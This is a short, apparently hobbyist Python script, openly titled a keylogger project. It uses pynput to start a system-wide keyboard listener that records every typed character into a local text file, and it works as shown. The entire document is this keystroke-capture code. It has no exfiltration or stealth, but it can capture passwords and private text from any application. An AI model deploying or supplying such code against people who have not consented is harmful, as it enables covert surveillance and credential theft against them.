# Keylogger Project in Python


from pynput import keyboard

# Created a function to record when keys are pressed
def keyPressed(key): 
    # Prints the pressed key and records it into a text file
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
        # If any errors occur such as when a special key is pressed, it would get printed.
            print("Error getting char") 


# Main script
if __name__ =="__main__":
    # Create a listener that triggers the function above
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()